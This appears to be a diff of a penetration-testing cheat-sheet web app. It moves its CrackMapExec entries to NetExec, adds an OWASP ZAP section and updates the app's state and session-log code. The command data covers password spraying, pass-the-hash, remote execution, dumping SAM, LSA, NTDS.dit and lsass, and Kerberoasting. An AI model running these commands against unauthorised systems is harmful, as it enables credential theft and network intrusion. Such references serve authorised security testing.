-        {p:'Enumerate shares — with creds',c:'cme smb TARGETIP -u "user" -p "password" --shares',h:'Authenticated share listing. Shows READ/WRITE permissions per share.'},
-        {p:'List logged-on users',c:'cme smb TARGETIP -u "user" -p "password" --loggedon-users',h:'Shows currently logged-on users. High-value targets if domain admin is active.'},
-        {p:'List local users',c:'cme smb TARGETIP -u "user" -p "password" --local-users',h:'Enumerate local user accounts. Useful for understanding the local attack surface.'},
-        {p:'List domain users',c:'cme smb TARGETIP -u "user" -p "password" --users',h:'Dump domain user list. Good starting point for password spraying.'},
-        {p:'List local groups',c:'cme smb TARGETIP -u "user" -p "password" --local-groups',h:'Enumerate local groups. Check who is in "Administrators" and "Remote Desktop Users".'},
-        {p:'Check password policy',c:'cme smb TARGETIP -u "user" -p "password" --pass-pol',h:'ALWAYS check password policy before spraying. Shows lockout threshold and duration.'},
-        {p:'Enumerate subnets (whole range)',c:'cme smb TARGETIP/24',h:'Scan entire subnet. Finds all SMB hosts. Great for internal network mapping.'},
+        {p:'Enumerate host — null session',c:'nxc smb TARGETIP',h:'SMB banner grab. Shows hostname, domain, OS version, SMB signing status. Always run first — no credentials needed.'},
+        {p:'Enumerate shares — null session',c:'nxc smb TARGETIP --shares',h:'List all shares without credentials. Non-default shares (not ADMIN$, C$, IPC$, NETLOGON, SYSVOL) are interesting.'},
+        {p:'Enumerate shares — with creds',c:'nxc smb TARGETIP -u "user" -p "password" --shares',h:'Authenticated share listing. Shows READ/WRITE permissions per share.'},
+        {p:'List logged-on users',c:'nxc smb TARGETIP -u "user" -p "password" --loggedon-users',h:'Shows active user sessions. Domain admin logged on = high-value target for token impersonation.'},
+        {p:'List local users',c:'nxc smb TARGETIP -u "user" -p "password" --local-users',h:'Enumerate local accounts on the target host.'},
+        {p:'List domain users',c:'nxc smb TARGETIP -u "user" -p "password" --users',h:'Dump domain user list. Feed into spraying wordlist.'},
+        {p:'List local groups',c:'nxc smb TARGETIP -u "user" -p "password" --local-groups',h:'Check "Administrators" and "Remote Desktop Users" membership.'},
+        {p:'Check password policy',c:'nxc smb TARGETIP -u "user" -p "password" --pass-pol',h:'ALWAYS check before spraying. Lockout threshold, duration, and minimum password length.'},
+        {p:'Scan entire subnet',c:'nxc smb TARGETIP/24',h:'Find all SMB hosts on the subnet. Essential for internal network mapping.'},
+        {p:'Generate relay target list',c:'nxc smb TARGETIP/24 --gen-relay-list relay.txt',h:'Outputs all hosts with SMB signing disabled — valid NTLM relay targets.'},
       ]},
       {name:'Authentication & Password Spraying',cmds:[
-        {p:'Validate single credential',c:'cme smb TARGETIP -u "user" -p "password"',h:'Test one credential pair. (Pwn3d!) = local admin rights. Green = valid, red = invalid.'},
-        {p:'Password spray — user list',c:'cme smb TARGETIP -u users.txt -p "Password123" --continue-on-success',h:'One password against many users. --continue-on-success prevents stopping on first hit. Respect lockout policy!'},
-        {p:'Spray with user=pass',c:'cme smb TARGETIP -u users.txt -p users.txt --no-bruteforce --continue-on-success',h:'--no-bruteforce pairs user[0] with pass[0] (not cartesian). Tests username=password pattern.'},
-        {p:'Local account auth',c:'cme smb TARGETIP -u "administrator" -p "password" --local-auth',h:'--local-auth targets the local SAM database, not domain. Use for local admin reuse attacks.'},
-        {p:'Pass-the-Hash (PTH)',c:'cme smb TARGETIP -u "administrator" -H "NTHASH"',h:'Authenticate with NTLM hash — no plaintext needed. Hash format: LM:NT or just NT hash.'},
-        {p:'Kerberos authentication',c:'cme smb TARGETIP -u "user" -p "password" -k',h:'-k uses Kerberos ticket instead of NTLM. Requires proper DNS/KDC config and valid TGT.'},
-        {p:'Null session (anonymous)',c:'cme smb TARGETIP -u "" -p ""',h:'Test null session access. Some older or misconfigured Windows hosts allow anonymous SMB.'},
+        {p:'Validate credential',c:'nxc smb TARGETIP -u "user" -p "password"',h:'(Pwn3d!) = local admin. Green = valid credential. Use immediately to execute commands.'},
+        {p:'Password spray — user list',c:'nxc smb TARGETIP -u users.txt -p "Password123" --continue-on-success',h:'One password against many users. --continue-on-success keeps going after first hit. Always check pass-pol first!'},
+        {p:'Spray with user=pass',c:'nxc smb TARGETIP -u users.txt -p users.txt --no-bruteforce --continue-on-success',h:'--no-bruteforce pairs user[0]:pass[0]. Tests username=password. Effective against new AD installs.'},
+        {p:'Local account auth',c:'nxc smb TARGETIP -u "administrator" -p "password" --local-auth',h:'Targets local SAM database, not domain. Use for local admin password reuse across hosts.'},
+        {p:'Pass-the-Hash (PTH)',c:'nxc smb TARGETIP -u "administrator" -H "NTHASH"',h:'Authenticate with NT hash only. Format: LM:NT or just the 32-char NT hash.'},
+        {p:'Kerberos authentication',c:'nxc smb TARGETIP -u "user" -p "password" -k',h:'-k uses Kerberos TGT instead of NTLM. Requires proper DNS and KDC connectivity.'},
+        {p:'Null session test',c:'nxc smb TARGETIP -u "" -p ""',h:'Anonymous SMB test. Misconfigured legacy hosts may allow full enumeration without credentials.'},
       ]},
       {name:'Command Execution',cmds:[
-        {p:'Run command via SMB (wmiexec)',c:'cme smb TARGETIP -u "user" -p "password" -x "whoami /all"',h:'-x runs command via WMI. Returns output. Requires admin rights. Leaves WMI traces.'},
-        {p:'Run PowerShell command',c:'cme smb TARGETIP -u "user" -p "password" -X "Get-Process | Select Name,Id"',h:'-X executes PowerShell. Useful for running PS-based payloads or enumeration scripts.'},
-        {p:'Execute method: smbexec',c:'cme smb TARGETIP -u "user" -p "password" -x "whoami" --exec-method smbexec',h:'smbexec creates a service for execution. Noisier than wmiexec but works when WMI is blocked.'},
-        {p:'Execute method: atexec',c:'cme smb TARGETIP -u "user" -p "password" -x "whoami" --exec-method atexec',h:'atexec uses Task Scheduler. Creates a scheduled task, runs it, deletes it.'},
-        {p:'Upload and execute file',c:'cme smb TARGETIP -u "user" -p "password" --put-file /local/file.exe \\Windows\\Temp\\file.exe',h:'Upload file to target. Combine with -x to execute it. Clean up afterwards.'},
+        {p:'Run CMD command (wmiexec)',c:'nxc smb TARGETIP -u "user" -p "password" -x "whoami /all"',h:'-x runs via WMI. Returns command output directly. Default exec method, requires admin.'},
+        {p:'Run PowerShell command',c:'nxc smb TARGETIP -u "user" -p "password" -X "Get-Process | Select Name,Id"',h:'-X executes PowerShell. Great for enumeration scripts and PS-based payloads.'},
+        {p:'Execute via smbexec',c:'nxc smb TARGETIP -u "user" -p "password" -x "whoami" --exec-method smbexec',h:'Creates a Windows service to run command. Noisier but works when WMI is blocked.'},
+        {p:'Execute via atexec',c:'nxc smb TARGETIP -u "user" -p "password" -x "whoami" --exec-method atexec',h:'Uses Task Scheduler. Creates task, runs it, deletes it. Leaves scheduled task logs.'},
+        {p:'Upload file to target',c:'nxc smb TARGETIP -u "user" -p "password" --put-file /local/file.exe \\Windows\\Temp\\file.exe',h:'Upload local file to remote path. Follow with -x to execute. Clean up after engagement.'},
       ]},
       {name:'Credential Dumping',cmds:[
-        {p:'Dump SAM database (local hashes)',c:'cme smb TARGETIP -u "administrator" -p "password" --sam',h:'Dumps local SAM hashes. Requires local admin. Use hashes for PTH or crack offline.'},
-        {p:'Dump LSA secrets',c:'cme smb TARGETIP -u "administrator" -p "password" --lsa',h:'LSA secrets contain service account credentials, cached domain creds, and machine account hash.'},
-        {p:'Dump NTDS.dit (domain hashes)',c:'cme smb TARGETIP -u "administrator" -p "password" --ntds',h:'Dumps ALL domain hashes from DC. Requires Domain Admin or DC access. Gold for the engagement.'},
-        {p:'Dump with secretsdump module',c:'cme smb TARGETIP -u "administrator" -p "password" -M secretsdump',h:'Uses impacket secretsdump under the hood. Dumps SAM + LSA + cached creds in one shot.'},
-        {p:'Dump lsass via nanodump',c:'cme smb TARGETIP -u "administrator" -p "password" -M nanodump',h:'Module-based lsass dump. Retrieves plaintext credentials and hashes from memory.'},
+        {p:'Dump SAM (local hashes)',c:'nxc smb TARGETIP -u "administrator" -p "password" --sam',h:'Dumps local SAM hashes. Requires local admin. Use NT hashes for PTH or crack offline.'},
+        {p:'Dump LSA secrets',c:'nxc smb TARGETIP -u "administrator" -p "password" --lsa',h:'LSA secrets: service account creds, cached domain credentials, machine account hash.'},
+        {p:'Dump NTDS.dit (all domain hashes)',c:'nxc smb TARGETIP -u "administrator" -p "password" --ntds',h:'Dumps ALL domain hashes from DC. Requires Domain Admin. The ultimate engagement prize.'},
+        {p:'Secretsdump module',c:'nxc smb TARGETIP -u "administrator" -p "password" -M secretsdump',h:'Impacket secretsdump via module. Dumps SAM + LSA + cached creds in one shot.'},
+        {p:'Lsass dump via nanodump',c:'nxc smb TARGETIP -u "administrator" -p "password" -M nanodump',h:'Module-based lsass dump. Extracts plaintext credentials and NT hashes from memory.'},
       ]},
       {name:'LDAP / Active Directory',cmds:[
-        {p:'Enumerate domain users via LDAP',c:'cme ldap TARGETIP -u "user" -p "password" --users',h:'LDAP-based user enumeration. More reliable than SMB in some environments.'},
-        {p:'Find AS-REP roastable users',c:'cme ldap TARGETIP -u "user" -p "password" --asreproast asrep.txt',h:'Finds accounts with "Do not require Kerberos preauthentication" set. Crack with hashcat -m 18200.'},
-        {p:'Kerberoast — find SPNs',c:'cme ldap TARGETIP -u "user" -p "password" --kerberoasting kerb.txt',h:'Requests service tickets for all SPN accounts. Crack offline with hashcat -m 13100.'},
-        {p:'BloodHound collection',c:'cme ldap TARGETIP -u "user" -p "password" --bloodhound -ns TARGETIP -c All',h:'Collects all BloodHound data (users, groups, ACLs, sessions). Import .zip into BloodHound GUI.'},
-        {p:'Find admin accounts',c:'cme ldap TARGETIP -u "user" -p "password" --admin-count',h:'Lists accounts with adminCount=1. These accounts have elevated privileges in the domain.'},
-        {p:'Enumerate domain groups',c:'cme ldap TARGETIP -u "user" -p "password" --groups',h:'List all domain groups. Look for interesting groups: "Domain Admins", "Enterprise Admins", "DNSAdmins".'},
+        {p:'Enumerate domain users via LDAP',c:'nxc ldap TARGETIP -u "user" -p "password" --users',h:'LDAP-based user enumeration. More reliable than SMB in some AD environments.'},
+        {p:'Find AS-REP roastable users',c:'nxc ldap TARGETIP -u "user" -p "password" --asreproast asrep.txt',h:'Finds accounts with "no preauthentication". Crack: hashcat -m 18200 asrep.txt wordlist.txt'},
+        {p:'Kerberoast — find SPNs',c:'nxc ldap TARGETIP -u "user" -p "password" --kerberoasting kerb.txt',h:'Requests TGS for all SPN accounts. Crack: hashcat -m 13100 kerb.txt wordlist.txt'},
+        {p:'BloodHound collection',c:'nxc ldap TARGETIP -u "user" -p "password" --bloodhound -ns TARGETIP -c All',h:'Collects all BloodHound data. Import .zip into BloodHound GUI for path analysis.'},
+        {p:'Find admin accounts',c:'nxc ldap TARGETIP -u "user" -p "password" --admin-count',h:'Lists accounts with adminCount=1 — elevated domain privileges.'},
+        {p:'Enumerate domain groups',c:'nxc ldap TARGETIP -u "user" -p "password" --groups',h:'List all domain groups. Focus: Domain Admins, Enterprise Admins, DNSAdmins, Backup Operators.'},
       ]},
-      {name:'WinRM & Other Protocols',cmds:[
-        {p:'WinRM — test access',c:'cme winrm TARGETIP -u "user" -p "password"',h:'Test WinRM (port 5985/5986) access. (Pwn3d!) = can get remote PS session via evil-winrm.'},
-        {p:'WinRM — run command',c:'cme winrm TARGETIP -u "user" -p "password" -x "whoami"',h:'Execute command over WinRM. Less noisy than SMB exec methods.'},
-        {p:'MSSQL — authenticate',c:'cme mssql TARGETIP -u "sa" -p "password"',h:'Test MSSQL credentials. (Pwn3d!) = sysadmin role. Can enable xp_cmdshell for RCE.'},
-        {p:'MSSQL — execute OS command',c:'cme mssql TARGETIP -u "sa" -p "password" -x "whoami"',h:'Runs OS command via xp_cmdshell. CME auto-enables it if sysadmin. Disable after use.'},
-        {p:'SSH — validate credential',c:'cme ssh TARGETIP -u "user" -p "password"',h:'Test SSH credentials. CME can spray SSH the same way as SMB.'},
-        {p:'SSH — password spray',c:'cme ssh TARGETIP -u users.txt -p passwords.txt --no-bruteforce',h:'Spray SSH with user:pass pairs. Slower than hydra but integrates with CME workflow.'},
+      {name:'WinRM, MSSQL, SSH & RDP',cmds:[
+        {p:'WinRM — test access',c:'nxc winrm TARGETIP -u "user" -p "password"',h:'(Pwn3d!) = user in Remote Management Users → get full shell with evil-winrm.'},
+        {p:'WinRM — run command',c:'nxc winrm TARGETIP -u "user" -p "password" -x "whoami"',h:'Execute command over WinRM. Quieter than SMB exec methods.'},
+        {p:'MSSQL — authenticate',c:'nxc mssql TARGETIP -u "sa" -p "password"',h:'Test MSSQL credentials. (Pwn3d!) = sysadmin → enable xp_cmdshell for OS command execution.'},
+        {p:'MSSQL — run OS command',c:'nxc mssql TARGETIP -u "sa" -p "password" -x "whoami"',h:'Runs OS command via xp_cmdshell. nxc enables it automatically if sysadmin. Disable after use.'},
+        {p:'SSH — credential check',c:'nxc ssh TARGETIP -u "user" -p "password"',h:'Validate SSH credentials. Spray the same credential set against SSH as SMB.'},
+        {p:'SSH — password spray',c:'nxc ssh TARGETIP -u users.txt -p passwords.txt --no-bruteforce',h:'Spray SSH with user:pass pairs. --no-bruteforce pairs positionally (user0:pass0).'},
+        {p:'RDP — credential check',c:'nxc rdp TARGETIP -u "user" -p "password"',h:'Check RDP (3389) credentials. nxc supports RDP enumeration unlike legacy CrackMapExec.'},
       ]},
     ],
   },
@@ -2159,6 +2232,54 @@ const TOOLS_DB = {
       ]},
     ],
   },
+  zap:{
+    label:'zap', desc:'OWASP ZAP',
+    categories:[
+      {name:'Setup & Proxy',cmds:[
+        {p:'Start ZAP GUI',c:'zaproxy',h:'Launch ZAP. First run generates CA cert — install it in your browser for HTTPS interception.'},
+        {p:'Start ZAP daemon (headless)',c:'zap.sh -daemon -host 127.0.0.1 -port 8080 -config api.key=changeme',h:'Headless mode. No GUI. REST API available at http://localhost:8080/JSON/ — use for automation.'},
+        {p:'Set proxy in browser',c:'127.0.0.1:8080',h:'Proxy settings → Manual → HTTP Proxy: 127.0.0.1 Port: 8080. Works in Firefox, Chrome, Burp-like workflow.'},
+        {p:'Export & import ZAP CA cert',c:'-- Export: Tools → Options → Network → Server Certificates → Save\n-- Firefox: about:preferences#privacy → Certificates → Import\n-- Chrome: Settings → Privacy → Certificates → Import',h:'Required for HTTPS interception. Do this before visiting the target site.'},
+        {p:'Add target to scope',c:'Right-click site in Sites tree → Include in Context → Default Context',h:'Define scope before scanning. ZAP only actively scans in-scope URLs. Prevents accidental external scans.'},
+        {p:'Check ZAP API status',c:'curl "http://localhost:8080/JSON/core/view/version/?apikey=changeme"',h:'Verify daemon is running. Returns ZAP version. Use this to build automation scripts.'},
+      ]},
+      {name:'Spider (Crawler)',cmds:[
+        {p:'Spider from GUI',c:'Right-click target in Sites tree → Attack → Spider',h:'Follows all HTML links and forms. Fast and lightweight. Best for traditional server-rendered apps.'},
+        {p:'AJAX Spider (JavaScript apps)',c:'Tools → AJAX Spider → Target URL: http://TARGETIP → Start Scan',h:'Uses a real browser (Firefox/Chrome) to crawl JavaScript-rendered content. Slower but essential for SPAs and React/Vue/Angular apps.'},
+        {p:'Spider via API',c:'curl "http://localhost:8080/JSON/spider/action/scan/?apikey=changeme&url=http://TARGETIP&recurse=true"',h:'Trigger spider programmatically. Returns scanId. Poll /JSON/spider/view/status/?scanId=0 for progress.'},
+        {p:'AJAX Spider via API',c:'curl "http://localhost:8080/JSON/ajaxSpider/action/scan/?apikey=changeme&url=http://TARGETIP"',h:'Automated AJAX spider. Requires geckodriver (Firefox) or ChromeDriver. Poll ajaxSpider/view/status/'},
+        {p:'View all discovered URLs',c:'curl "http://localhost:8080/JSON/spider/view/results/?apikey=changeme&scanId=0"',h:'Returns all URLs found by spider. Feed these to Active Scan for full coverage.'},
+      ]},
+      {name:'Active Scanner',cmds:[
+        {p:'Active Scan from GUI',c:'Right-click target URL → Attack → Active Scan → Start Scan',h:'Sends attack payloads to every discovered parameter. Tests SQLi, XSS, RCE, SSRF, path traversal, and more.'},
+        {p:'Active Scan via API',c:'curl "http://localhost:8080/JSON/ascan/action/scan/?apikey=changeme&url=http://TARGETIP&recurse=true"',h:'Trigger active scan. Returns scanId. Check progress: /JSON/ascan/view/status/?scanId=0 — wait for 100.'},
+        {p:'Scan single endpoint',c:'curl "http://localhost:8080/JSON/ascan/action/scan/?apikey=changeme&url=http://TARGETIP/login&recurse=false"',h:'Focus the active scan on a single URL — useful for in-depth testing of login forms or API endpoints.'},
+        {p:'View all alerts (findings)',c:'curl "http://localhost:8080/JSON/core/view/alerts/?apikey=changeme&baseurl=http://TARGETIP"',h:'Returns all findings with risk level (High/Medium/Low/Informational), description, and evidence.'},
+        {p:'Export HTML report',c:'curl "http://localhost:8080/OTHER/core/other/htmlreport/?apikey=changeme" -o zap_report.html',h:'Full vulnerability report. Also: xmlreport (XML), jsonreport (JSON), mdreport (Markdown).'},
+      ]},
+      {name:'Fuzzer (Burp Intruder alternative)',cmds:[
+        {p:'Fuzz a captured request',c:'History tab → right-click request → Fuzz → highlight value → Add → choose payload type',h:'Select the value to fuzz (parameter, header, path segment), add payload list or generator, run.'},
+        {p:'File payload (wordlist)',c:'Fuzzer → Payloads → Add → Type: File → select .txt wordlist',h:'Use SecLists: /usr/share/seclists/Fuzzing/ — SQLi, XSS, path traversal, command injection payloads.'},
+        {p:'Number sequence payload (IDOR)',c:'Fuzzer → Payloads → Add → Type: Numberzz → From: 1, To: 10000, Step: 1',h:'Integer sequence for IDOR testing. Fuzz /api/user/FUZZ or /invoice/FUZZ to enumerate object IDs.'},
+        {p:'Regex payload generator',c:'Fuzzer → Payloads → Add → Type: Regex → e.g. [A-Z]{2}[0-9]{4}',h:'Generate values matching a pattern. Useful for token formats, order IDs, reference numbers.'},
+        {p:'Filter Fuzzer results',c:'Fuzzer results → right-click column header → enable Size Resp. Body, Time (ms)',h:'Sort by response size or time anomalies to find hits. Different size = different behavior = interesting.'},
+      ]},
+      {name:'Manual Interception & Proxy',cmds:[
+        {p:'Enable intercept (break point)',c:'Click the green circle (top toolbar) → turns red = all requests intercepted',h:'All traffic pauses. Review and modify each request manually. Click Forward to proceed, Drop to discard.'},
+        {p:'Replay and modify request',c:'History tab → right-click any request → Open/Resend with Request Editor',h:'Like Burp Repeater. Modify headers, parameters, body and resend. Shows diff between requests.'},
+        {p:'Set form-based authentication',c:'Context → Authentication → Form-based → Login URL + username/password fields',h:'Configure ZAP to stay authenticated during active scan. Essential for authenticated application testing.'},
+        {p:'Manual HTTP request editor',c:'Tools → Manual Request Editor → type raw HTTP → Send',h:'Send arbitrary HTTP requests without browser. Built-in Repeater-like capability.'},
+        {p:'Add request to active scan',c:'History → right-click request → Attack → Active Scan this message',h:'Trigger targeted active scanning on a specific captured request. Useful for complex POST requests.'},
+      ]},
+      {name:'Passive Scan & WebSockets',cmds:[
+        {p:'View passive scan alerts',c:'Alerts tab → filter by Risk level',h:'Passive scan runs automatically on every request. Finds insecure headers, cookie flags, JS issues without any active probing.'},
+        {p:'Check remaining passive scan queue',c:'curl "http://localhost:8080/JSON/pscan/view/recordsToScan/?apikey=changeme"',h:'Wait until 0 before exporting final results. All traffic seen so far will be analyzed.'},
+        {p:'WebSocket intercept',c:'WebSockets tab → enable intercept → browse the app',h:'ZAP captures all WebSocket frames automatically. Review and modify WS messages in real time.'},
+        {p:'Replay WebSocket frame',c:'WebSockets tab → right-click frame → Replay in Browser',h:'Resend a captured WebSocket frame with modifications. Test WS injection, authentication bypass.'},
+        {p:'Find sensitive data leaks',c:'Alerts tab → Information Disclosure alerts',h:'ZAP flags hidden form fields, credentials in comments, stack traces in error responses.'},
+      ]},
+    ],
+  },
   pspy:{
     label:'pspy', desc:'Process Spy',
     categories:[
@@ -2526,19 +2647,24 @@ const ENUM_DB = {
 // ═══════════════════════════════════════════════════
 const STORAGE_KEY = 'reconflow_v3';
 let state = loadState();
-let currentSvc = null; // service key or '__session__'
+let currentSvc = null;
+let CMD_REGISTRY = {}; // id → raw cmd.c template (populated on render, enables cross-page sync)
+
+const DEFAULT_STATE = {ip:'',svcStatus:{},checks:{},notes:{},activeTool:{},session:[],collapsed:{},infoOpen:{},lang:'en',sectionOpen:{services:true,tools:true,env:true},toolFavorites:{},customCmds:{},cmdLog:[],sessionName:'SESSION 1',targetVars:{port:'',domain:'',user:'',pass:'',hash:'',wordlist:''}};
 
 function loadState() {
   try {
     const s = JSON.parse(localStorage.getItem(STORAGE_KEY));
-    return Object.assign({ip:'',svcStatus:{},checks:{},notes:{},activeTool:{},session:[],collapsed:{},infoOpen:{},lang:'en',sectionOpen:{services:true,tools:true,env:true},toolFavorites:{},customCmds:{},cmdLog:[]}, s||{});
-  } catch { return {ip:'',svcStatus:{},checks:{},notes:{},activeTool:{},session:[],collapsed:{},infoOpen:{},lang:'en',sectionOpen:{services:true,tools:true,env:true},toolFavorites:{},customCmds:{},cmdLog:[]}; }
+    const merged = Object.assign({}, DEFAULT_STATE, s||{});
+    if (!merged.targetVars) merged.targetVars = {port:'',domain:'',user:'',pass:'',hash:'',wordlist:''};
+    return merged;
+  } catch { return Object.assign({}, DEFAULT_STATE); }
 }
 function saveState() { localStorage.setItem(STORAGE_KEY, JSON.stringify(state)); }
 function clearState() {
   if (!confirm(t('clearConfirm'))) return;
   const lang = state.lang;
-  state = {ip:'',svcStatus:{},checks:{},notes:{},activeTool:{},session:[],collapsed:{},infoOpen:{},lang};
+  state = Object.assign({}, DEFAULT_STATE, {lang});
   saveState();
   document.getElementById('ipInput').value = '';
   renderSidebar();
@@ -2546,8 +2672,25 @@ function clearState() {
 }
 
 function getIP() { return document.getElementById('ipInput').value.trim() || 'TARGETIP'; }
-function injectIP(s) { return s.replace(/TARGETIP/g, getIP()); }
+function injectVars(s) {
+  const tv = state.targetVars || {};
+  s = s.replace(/TARGETIP/g, document.getElementById('ipInput').value.trim() || 'TARGETIP');
+  s = s.replace(/TARGETPORT/g, tv.port || 'TARGETPORT');
+  s = s.replace(/TARGETDOMAIN/g, tv.domain || 'TARGETDOMAIN');
+  s = s.replace(/TARGETUSER/g, tv.user || 'TARGETUSER');
+  s = s.replace(/TARGETPASS/g, tv.pass || 'TARGETPASS');
+  s = s.replace(/TARGETHASH/g, tv.hash || 'TARGETHASH');
+  s = s.replace(/TARGETWL/g, tv.wordlist || 'TARGETWL');
+  return s;
+}
+function injectIP(s) { return injectVars(s); }
 function esc(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+function saveTargetVar(key, val) {
+  if (!state.targetVars) state.targetVars = {};
+  state.targetVars[key] = val;
+  saveState();
+}
 
 // ═══════════════════════════════════════════════════
 //  SIDEBAR
@@ -2567,6 +2710,13 @@ function renderSidebar() {
   if (!state.sectionOpen) state.sectionOpen = {services:true,tools:true};
   const svOpen = state.sectionOpen.services !== false;
   const tlOpen = state.sectionOpen.tools !== false;
+
+  // TARGET button (above INIT)
+  sb.insertAdjacentHTML('beforeend', `
+    <button class="tool-nav-btn target-btn${currentSvc==='__target__'?' active':''}" onclick="navigate('__target__')">
+      <span class="svc-label" style="font-weight:bold;letter-spacing:.5px">TARGET</span>
+    </button>
+  `);
 
   // INIT button
   sb.insertAdjacentHTML('beforeend', `
@@ -2622,7 +2772,6 @@ function renderSidebar() {
       sb.insertAdjacentHTML('beforeend', `
         <button class="tool-nav-btn${currentSvc===key?' active':''}" onclick="navigate('${key}')">
           <span class="svc-label">${tool.label}</span>
-          <span class="tool-nav-desc">${tool.desc}</span>
         </button>
       `);
     });
@@ -2643,20 +2792,11 @@ function renderSidebar() {
       sb.insertAdjacentHTML('beforeend', `
         <button class="tool-nav-btn${currentSvc===key?' active':''}" onclick="navigate('${key}')">
           <span class="svc-label">${item.label}</span>
-          <span class="tool-nav-desc">${item.desc}</span>
         </button>
       `);
     });
   }
-
-  // CMD LOG
-  const logCount = (state.cmdLog||[]).length;
-  sb.insertAdjacentHTML('beforeend',`<hr class="sb-sep">
-    <button class="tool-nav-btn${currentSvc==='__cmdlog__'?' active':''}" onclick="navigate('__cmdlog__')" style="${currentSvc==='__cmdlog__'?'':'color:var(--green);border-left-color:transparent'}">
-      <span class="svc-label" style="color:var(--green)">◎ CMD LOG</span>
-      <span class="tool-nav-desc">${logCount} entr${logCount===1?'y':'ies'}</span>
-    </button>
-  `);
+  renderHeaderSession();
 }
 
 function togglePin(e, key) {
@@ -2677,6 +2817,26 @@ function clearSession() {
   renderSidebar();
 }
 
+function renderHeaderSession() {
+  const el = document.getElementById('sessionHdr');
+  if (!el) return;
+  const count = (state.cmdLog||[]).length;
+  const name = state.sessionName || 'SESSION 1';
+  const isActive = currentSvc === '__cmdlog__';
+  el.innerHTML = `<button class="hdr-session${isActive?' active':''}" onclick="navigate('__cmdlog__')" ondblclick="renameSession(event)" title="Click to open · Double-click to rename">${name}${count>0?` <span style="opacity:.55;font-weight:400;font-size:10px">(${count})</span>`:''}</button>`;
+}
+
+function renameSession(e) {
+  if (e) e.stopPropagation();
+  const name = prompt('Session name:', state.sessionName || 'SESSION 1');
+  if (name !== null && name.trim()) {
+    state.sessionName = name.trim();
+    saveState();
+    renderHeaderSession();
+    if (currentSvc === '__cmdlog__') renderMain();
+  }
+}
+
 function navigate(key) {
   currentSvc = key;
   renderSidebar();
@@ -2687,10 +2847,13 @@ function navigate(key) {
 //  RENDER — shared primitives
 // ═══════════════════════════════════════════════════
 function renderCmdCard(cmd, id, isDone, note) {
+  CMD_REGISTRY[id] = cmd.c;
+  const logged = !!(state.cmdLog && state.cmdLog.some(e => e.rawTemplate === cmd.c));
   return `<div class="cmd-card${isDone?' done':''}" id="card_${id}">
     <div class="cmd-top">
       <input type="checkbox" class="cmd-check" ${isDone?'checked':''} onchange="toggleCheck('${id}',this.checked)">
       <span class="cmd-purpose">${esc(cmd.p)}</span>
+      <button class="btn-log${logged?' logged':''}" onclick="logCmd('${id}')" title="${logged?'Already in session':'Add to session'}">${logged?'✓':'+'}</button>
       <button class="btn-copy" onclick="copyCmd('${id}',this)">${t('copy')}</button>
     </div>
     <div class="cmd-body">
@@ -2818,12 +2981,14 @@ function renderSession() {
 //  RENDER — tool view
 // ═══════════════════════════════════════════════════
 function renderToolCmdCard(cmd, id, note) {
+  CMD_REGISTRY[id] = cmd.c;
   const starred = !!(state.toolFavorites?.[id]);
+  const logged = !!(state.cmdLog && state.cmdLog.some(e => e.rawTemplate === cmd.c));
   return `<div class="cmd-card" id="card_${id}">
     <div class="cmd-top">
       <span class="cmd-purpose">${esc(cmd.p)}</span>
       <button class="btn-star${starred?' starred':''}" onclick="toggleFavorite('${id}')" title="Favorite">${starred?'★':'☆'}</button>
-      <button class="btn-log" onclick="logCmd('${id}')" title="Add to CMD Log">+</button>
+      <button class="btn-log${logged?' logged':''}" onclick="logCmd('${id}')" title="${logged?'Already in session':'Add to session'}">${logged?'✓':'+'}</button>
       <button class="btn-copy" onclick="copyCmd('${id}',this)">${t('copy')}</button>
     </div>
     <div class="cmd-body">
@@ -2865,12 +3030,14 @@ function renderCustomCmds(toolKey) {
   let html = `<div class="phase"><div class="phase-title">✎ ${t('customTitle')}</div>`;
   cmds.forEach((cmd, ci) => {
     const id = `_tc_${toolKey}_${ci}`;
+    CMD_REGISTRY[id] = cmd.c;
     const starred = !!(state.toolFavorites?.[id]);
+    const logged = !!(state.cmdLog && state.cmdLog.some(e => e.rawTemplate === cmd.c));
     html += `<div class="cmd-card" id="card_${id}">
       <div class="cmd-top">
         <span class="cmd-purpose">${esc(cmd.p)||'—'}</span>
         <button class="btn-star${starred?' starred':''}" onclick="toggleFavorite('${id}')">${starred?'★':'☆'}</button>
-        <button class="btn-log" onclick="logCmd('${id}')" title="Add to CMD Log">+</button>
+        <button class="btn-log${logged?' logged':''}" onclick="logCmd('${id}')" title="${logged?'Already in session':'Add to session'}">${logged?'✓':'+'}</button>
         <button class="btn-copy" onclick="copyCmd('${id}',this)">${t('copy')}</button>
         <button class="btn-rmv-sm" onclick="removeCustomCmd('${toolKey}',${ci})" title="Remove">✕</button>
       </div>
@@ -3031,29 +3198,47 @@ function removeCustomCmd(toolKey, idx) {
 //  CMD LOG
 // ═══════════════════════════════════════════════════
 function logCmd(id) {
+  if (!state.cmdLog) state.cmdLog = [];
+  const rawTemplate = CMD_REGISTRY[id] || '';
+  // If already logged → remove (toggle off)
+  if (rawTemplate && state.cmdLog.some(e => e.rawTemplate === rawTemplate)) {
+    const idx = state.cmdLog.findIndex(e => e.rawTemplate === rawTemplate);
+    if (idx !== -1) state.cmdLog.splice(idx, 1);
+    saveState();
+    Object.entries(CMD_REGISTRY).forEach(([cid, tpl]) => {
+      if (tpl === rawTemplate) {
+        const el = document.getElementById('card_'+cid);
+        if (el) { const btn = el.querySelector('.btn-log'); if (btn) { btn.classList.remove('logged'); btn.textContent = '+'; } }
+      }
+    });
+    renderHeaderSession();
+    return;
+  }
   const codeEl = document.getElementById('code_'+id);
   const cardEl = document.getElementById('card_'+id);
   if (!codeEl) return;
-  const rawCmd = codeEl.innerText;
+  const injectedCmd = codeEl.innerText;
   const purpose = cardEl ? (cardEl.querySelector('.cmd-purpose')?.textContent || '') : '';
-  // Extract tool key: id formats _t_KEY_..., _e_KEY_..., _tc_KEY_...
+  // Extract tool key: id formats _t_KEY_..., _e_KEY_..., _tc_KEY_..., svckey_pi_tool_ci
   const parts = id.split('_').filter(Boolean);
-  const toolKey = parts[1]; // always index 1 after filter
-  const toolLabel = TOOLS_DB[toolKey]?.label || ENUM_DB[toolKey]?.label || toolKey;
+  const toolKey = id.startsWith('_') ? parts[1] : parts[0];
+  const toolLabel = TOOLS_DB[toolKey]?.label || ENUM_DB[toolKey]?.label || DB[toolKey]?.label || toolKey;
   const platform = TOOLS_INFO[toolKey]?.platform || ENUM_INFO[toolKey]?.platform || 'both';
   const logId = Date.now()+'_'+Math.random().toString(36).slice(2,7);
